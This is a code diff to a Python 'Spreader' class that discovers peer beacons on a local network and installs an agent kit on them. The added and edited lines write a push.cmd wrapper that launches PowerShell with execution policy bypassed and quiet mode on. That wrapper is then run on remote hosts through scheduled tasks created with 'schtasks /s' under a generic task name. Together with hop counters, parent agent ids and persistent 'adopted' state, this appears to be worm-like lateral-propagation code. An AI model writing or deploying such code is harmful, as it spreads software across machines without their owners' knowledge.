@@ -26,6 +26,7 @@ from . import discover as lan_discover
 
 CREATE_NO_WINDOW = 0x08000000 if config.IS_WINDOWS else 0
 ATTEMPT_TTL = 300.0
+ADOPTED_TTL = 86400.0     # a successfully adopted peer is left alone for a day
 
 
 # --------------------------------------------------------------------- process
@@ -72,6 +73,33 @@ class Spreader:
         self.kit_url_getter = kit_url_getter or (lambda: "")
         self.known_ids_getter = known_ids_getter or (lambda: set())
         self._attempted: dict = {}
+        self._adopted = self._load_adopted()
+
+    def _state_path(self) -> str:
+        base = config.ROOT
+        try:
+            os.makedirs(base, exist_ok=True)
+        except OSError:
+            base = tempfile.gettempdir()
+        return os.path.join(base, "adopted.json")
+
+    def _load_adopted(self) -> dict:
+        try:
+            import json
+            with open(self._state_path(), "r", encoding="utf-8") as handle:
+                data = json.load(handle)
+            cutoff = time.time() - ADOPTED_TTL
+            return {k: v for k, v in data.items() if float(v) > cutoff}
+        except Exception:
+            return {}
+
+    def _save_adopted(self) -> None:
+        try:
+            import json
+            with open(self._state_path(), "w", encoding="utf-8") as handle:
+                json.dump(self._adopted, handle)
+        except Exception:
+            pass
 
     def attach(self, lan, kit_url_getter=None, known_ids_getter=None) -> None:
         self.lan = lan
@@ -133,19 +161,24 @@ class Spreader:
                 "detail": _tail(out or err), "code": code}
 
     def adopt(self, peer: dict) -> dict:
-        """Handle one newly discovered beacon."""
         peer_id = peer.get("id") or ""
         if not peer_id:
             return {}
         record = self.ping_peer(peer.get("ip"), peer.get("port"))
         if not record.get("reachable"):
             return {"ok": False, "mode": "probe", "detail": record.get("error", "")}
-        # A peer already managed by us and on a current version needs nothing.
+
         managed = peer_id in set(self.known_ids_getter() or ())
         behind = _version_tuple(record.get("ver")) < _version_tuple(config.PRODUCT_VERSION)
-        if managed and not behind:
+        adopted_before = peer_id in self._adopted
+        if (managed or adopted_before) and not behind:
             return {"ok": True, "mode": "probe", "detail": "already managed"}
-        return self.pull_from_peer(peer, install=True)
+
+        result = self.pull_from_peer(peer, install=True)
+        if result.get("ok"):
+            self._adopted[peer_id] = time.time()
+            self._save_adopted()
+        return result
 
     def tick(self) -> dict:
         """Periodic: adopt orphan beacons, never more than once per ATTEMPT_TTL."""
@@ -159,8 +192,7 @@ class Spreader:
             peer_id = peer.get("id")
             if not peer_id or peer_id in self._attempted:
                 continue
-            if peer_id in managed and not peer.get("parent"):
-                pass  # ours, nothing to do
+
             if int(peer.get("hop") or 0) > config.HOP_LIMIT:
                 continue
             self._attempted[peer_id] = time.time()
@@ -200,6 +232,18 @@ class Spreader:
                 json.dump({"url": config.PUBLIC_URL, "room": config.ROOM,
                            "pass": config.PASSPHRASE, "parent": config.agent_id(),
                            "hop": config.hop() + 1}, handle)
+
+            base = self.kit_url() or config.PUBLIC_URL
+            wrapper = os.path.join(root, "push.cmd")
+            with open(wrapper, "w", encoding="ascii", newline="\r\n") as handle:
+                handle.write(
+                    "@echo off\r\n"
+                    'powershell -NoProfile -ExecutionPolicy Bypass '
+                    '-File "%~dp0install\\i.ps1" -Kit "%~dp0" '
+                    f'-Base "{base}" -Parent "{config.agent_id()}" '
+                    f'-ParentIp "{base}" -Room "{config.ROOM}" '
+                    f'-Pass "{config.PASSPHRASE}" -Hop {config.hop() + 1} -Quiet\r\n'
+                )
             return root
         except Exception:
             return ""
@@ -234,9 +278,7 @@ class Spreader:
                 return {"ok": False, "mode": "push", "ip": ip,
                         "detail": "xcopy failed: %s" % _tail(err, 160)}
 
-            script = ("powershell -NoProfile -ExecutionPolicy Bypass -File "
-                      "\"%s\\install\\i.ps1\" -Kit \"%s\" -Parent %s -ParentIp %s -Room \"%s\" -Pass \"%s\" -Quiet"
-                      % (win_dir, win_dir, config.agent_id(), self.kit_url() or config.PUBLIC_URL, config.ROOM, config.PASSPHRASE))
+            script = f"{win_dir}\\push.cmd"
             task = "SysPyDeploy%d" % int(time.time() % 100000)
             schtasks = ["schtasks", "/s", ip, "/create", "/f", "/tn", task, "/tr", script,
                         "/sc", "once", "/st", "23:59"]
